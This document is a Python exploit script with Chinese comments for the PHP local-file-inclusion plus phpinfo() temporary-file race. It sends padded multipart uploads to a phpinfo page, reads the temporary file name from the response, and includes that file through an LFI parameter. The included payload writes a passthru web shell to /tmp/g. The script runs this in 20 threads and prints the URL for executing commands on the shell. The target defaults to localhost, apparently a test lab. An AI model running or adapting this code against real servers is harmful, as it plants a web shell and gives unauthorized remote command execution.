#!/usr/bin/python
"""
注意:
    不要对本文件格式化!!!!
    不要对本文件格式化!!!!
    不要对本文件格式化!!!!
"""
import sys
import threading
import socket

# 已尝试次数
attempts_counter = 0


def setup(host, port, phpinfo_path, lfi_path, lfi_param, shell_code='<?php passthru($_GET["f"]);?>', shell_path='/tmp/g'):
    """
    根据提供参数返回请求内容
    :param host:HOST
    :param port:端口
    :param phpinfo_path: phpinfo文件地址
    :param lfi_path: 包含lfi的文件地址
    :param lfi_param: lfi载入文件时, 指定文件名的参数
    :param shell_code: shell代码
    :param shell_path: shell代码保存位置
    :return:
        phpinfo_request: phpinfo 请求内容
        lfi_request: lfi 请求内容
        tag: 标识内容
    """
    tag = 'Security Test'   # 搜索验证标识
    payload = \
'''{tag}\r
<?php $c=fopen('{shell_path}','w');fwrite($c,'{shell_code}');?>\r
'''.format(shell_code=shell_code, tag=tag, shell_path=shell_path)

    request_data = \
'''-----------------------------7dbff1ded0714\r
Content-Disposition: form-data; name="dummyname"; filename="test.txt"\r
Content-Type: text/plain\r
\r
{payload}
-----------------------------7dbff1ded0714--\r
''' .format(payload=payload)

    phpinfo_request = \
'''POST {phpinfo_path}?a={padding} HTTP/1.1\r
Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie={padding}\r
HTTP_ACCEPT: {padding}\r
HTTP_USER_AGENT: {padding}\r
HTTP_ACCEPT_LANGUAGE: {padding}\r
HTTP_PRAGMA: {padding}\r
Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r
Content-Length: {request_data_length}\r
Host: {host}:{port}\r
\r
{request_data}
'''.format(
    padding='A' * 5000,
    phpinfo_path=phpinfo_path,
    request_data_length=len(request_data),
    host=host,
    port=port,
    request_data=request_data
    )

    lfi_request = \
'''GET {lfi_path}?{lfi_param}={{}} HTTP/1.1\r
User-Agent: Mozilla/4.0\r
Proxy-Connection: Keep-Alive\r
Host: {host}\r
\r
\r
'''.format(
    lfi_path=lfi_path,
    lfi_param=lfi_param,
    host=host
    )
    return phpinfo_request, tag, lfi_request


def phpinfo_lfi(host, port, phpinfo_request, offset, lfi_request, tag):
    """
    通过向phpinfo发送大数据包延缓时间, 然后利用lfi执行
    :param host:HOST
    :param port:端口
    :param phpinfo_request: phpinfo页面请求内容
    :param offset: tmp_name在phpinfo中的偏移位
    :param lfi_request: lfi页面请求内容
    :param tag: 标识内容
    :return:
        tmp_file_name: 临时文件名
    """
    phpinfo_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    lfi_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    phpinfo_socket.connect((host, port))
    lfi_socket.connect((host, port))

    # 1. 先向phpinfo发送大数据包, 且其中包含php会将payload放入临时文件中
    phpinfo_socket.send(phpinfo_request.encode())

    phpinfo_response_data = ''
    while len(phpinfo_response_data) < offset:
        # 取不到数据则反复执行
        phpinfo_response_data += phpinfo_socket.recv(offset).decode()

    try:
        tmp_name_index = phpinfo_response_data.index('[tmp_name] =&gt')
        # 获取包含payload的临时文件名
        tmp_file_name = phpinfo_response_data[
                            tmp_name_index + 17:
                            tmp_name_index + 31
                        ]
    except ValueError:
        return None
    # 2. 再向lfi发送包含payload的临时文件名, 用于包含
    lfi_socket.send((lfi_request.format(tmp_file_name)).encode())
    lfi_response_data = lfi_socket.recv(4096).decode()

    # 3. 停止phpinfo socket连接
    phpinfo_socket.close()
    # 4. 停止lfi socket连接
    lfi_socket.close()
    if lfi_response_data.find(tag) != -1:
        # 5. lfi response中存在标识内容则payload执行成功
        return tmp_file_name


class ThreadWorker(threading.Thread):
    def __init__(self, event, lock, max_attempts,
                 host, port, phpinfo_request,
                 offset, lfi_request, tag,
                 shell_code, shell_path,
                 lfi_path, lfi_param):
        threading.Thread.__init__(self)
        self.event = event
        self.lock = lock
        self.max_attempts = max_attempts
        self.host = host
        self.port = port
        self.phpinfo_request = phpinfo_request
        self.offset = offset
        self.lfi_request = lfi_request
        self.tag = tag
        self.shell_code = shell_code
        self.shell_path = shell_path
        self.lfi_path = lfi_path
        self.lfi_param = lfi_param

    def run(self):
        global attempts_counter
        while not self.event.is_set():
            # 如果没有set event则一直重复执行, 直到已尝试次数大于最大尝试数(attempts_counter > max_attempts)
            with self.lock:
                # 获取锁, 执行完后释放
                if attempts_counter >= self.max_attempts:
                    return
                attempts_counter += 1
            try:
                tmp_file_name = phpinfo_lfi(
                    self.host, self.port, self.phpinfo_request, self.offset, self.lfi_request, self.tag)
                if self.event.is_set():
                    break
                if tmp_file_name:
                    # 找到tmp_file_name后通过set event停止运行
                    print('\n{shell_code} 已经被写入到{shell_path}中'.format(
                        shell_code=self.shell_code,
                        shell_path=self.shell_path
                    ))
                    'http://127.0.0.1/test/lfi_phpinfo/lfi.php?load=/tmp/gc&f=uname%20-a'
                    print('默认调用方法: http://{host}:{port}{lfi_path}?{lfi_param}={shell_path}&f=uname%20-a'.format(
                        host=self.host,
                        port=self.port,
                        lfi_path=self.lfi_path,
                        lfi_param=self.lfi_param,
                        shell_path=self.shell_path
                    ))

                    self.event.set()
            except socket.error:
                return


def get_offset(host, port, phpinfo_request):
    """
    获取tmp_name在phpinfo中的偏移量
    :param host: HOST
    :param port: 端口
    :param phpinfo_request: phpinfo 请求内容
    :return:
        tmp_name在phpinfo中的偏移量
    """

    phpinfo_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    phpinfo_socket.connect((host, port))
    phpinfo_socket.send(phpinfo_request.encode())
    phpinfo_response_data = ''
    while True:
        i = phpinfo_socket.recv(4096).decode()
        phpinfo_response_data += i
        if i == '':
            break

        # 检测是否是最后一个数据块
        if i.endswith('0\r\n\r\n'):
            break
    phpinfo_socket.close()
    tmp_name_index = phpinfo_response_data.find('[tmp_name] =&gt')
    if tmp_name_index == -1:
        raise ValueError('没有在phpinfo中找到tmp_name')
    print('找到了 {} 在phpinfo内容索引为{}的位置'.format(
        phpinfo_response_data[tmp_name_index:tmp_name_index+10], tmp_name_index))

    return tmp_name_index + 256


def main():
    pool_size = 20
    host = '127.0.0.1'
    port = 80
    phpinfo_path = '/test/lfi_phpinfo/phpinfo.php'
    lfi_path = '/test/lfi_phpinfo/lfi.php'
    lfi_param = 'load'
    shell_code = '<?php passthru($_GET["f"]);?>'
    shell_path = '/tmp/g'
    # 最大尝试次数
    max_attempts = 1000

    print('LFI With PHPInfo()')
    # 一 生成phpinfo请求内容, 标志内容, lfi请求内容
    phpinfo_request, tag, lfi_request = setup(
        host=host, port=port, phpinfo_path=phpinfo_path, lfi_path=lfi_path,
        lfi_param=lfi_param, shell_code=shell_code, shell_path=shell_path)

    # 二 获取[tmp_name]在phpinfo中的偏移位
    offset = get_offset(host, port, phpinfo_request)

    sys.stdout.flush()
    thread_event = threading.Event()
    thread_lock = threading.Lock()
    print('创建线程池 {}...'.format(pool_size))
    sys.stdout.flush()
    thread_pool = []
    for i in range(0, pool_size):
        # 三 多线程执行phpinfo_lfi
        thread_pool.append(ThreadWorker(thread_event, thread_lock, max_attempts,
                                        host, port, phpinfo_request, offset,
                                        lfi_request, tag,
                                        shell_code, shell_path,
                                        lfi_path, lfi_param
                                        ))
    for t in thread_pool:
        t.start()
    try:
        while not thread_event.wait(1):
            if thread_event.is_set():
                break
            with thread_lock:
                sys.stdout.write('\r{} / {}'.format(attempts_counter, max_attempts))
                sys.stdout.flush()
                if attempts_counter >= max_attempts:
                    # 尝试次数大于最大尝试次数则退出
                    break
        if thread_event.is_set():
            print('''
            老铁NB!老铁NB!老铁NB!老铁NB!老铁NB!老铁NB!老铁NB!
            老铁NB!老铁NB!老铁NB!老铁NB!老铁NB!老铁NB!老铁NB!
            老铁NB!老铁NB!老铁NB!老铁NB!老铁NB!老铁NB!老铁NB!
            老铁NB!老铁NB!老铁NB!老铁NB!老铁NB!老铁NB!老铁NB!
            ''')
        else:
            print('LJBD!')
    except KeyboardInterrupt:
        print('\n正在停止所有线程...')
        thread_event.set()
    for t in thread_pool:
        t.join()


if __name__ == "__main__":
    main()
